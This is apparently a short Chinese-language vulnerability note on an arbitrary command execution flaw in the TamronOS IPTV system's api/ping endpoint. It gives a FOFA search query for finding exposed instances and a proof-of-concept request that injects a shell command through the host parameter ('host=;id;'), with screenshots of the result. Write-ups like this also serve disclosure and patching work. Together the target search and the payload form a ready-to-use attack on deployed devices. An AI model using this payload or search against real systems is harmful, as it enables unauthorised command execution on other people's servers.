# TamronOS IPTV系统 ping 任意命令执行漏洞

## 漏洞描述

TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令

## 漏洞影响

```
TamronOS IPTV系统
```

## FOFA

```
app="TamronOS-IPTV系统"
```

## 漏洞复现

登录页面如下



![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101926621.png)



漏洞POC为



```plain
/api/ping?count=5&host=;id;
```



![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101927800.png)